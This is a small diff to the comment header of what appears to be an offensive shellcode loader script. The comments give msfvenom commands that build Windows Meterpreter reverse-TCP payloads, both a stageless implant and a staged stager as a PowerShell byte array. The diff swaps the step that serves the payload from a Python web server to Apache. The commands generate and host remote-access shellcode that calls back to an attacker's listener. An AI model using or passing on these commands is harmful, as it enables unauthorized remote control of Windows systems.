@@ -3,7 +3,7 @@
 #
 # Full implant (stageless, ~200KB) → download it at runtime (don't paste inline):
 #   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/sc.bin
-#   python3 -m http.server 80          # host /tmp/sc.bin
+#   sudo systemctl start apache2 && sudo cp /tmp/sc.bin /var/www/html/   # host /tmp/sc.bin
 #
 # Small shellcode (a staged stager) → paste the byte array inline instead:
 #   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f ps1
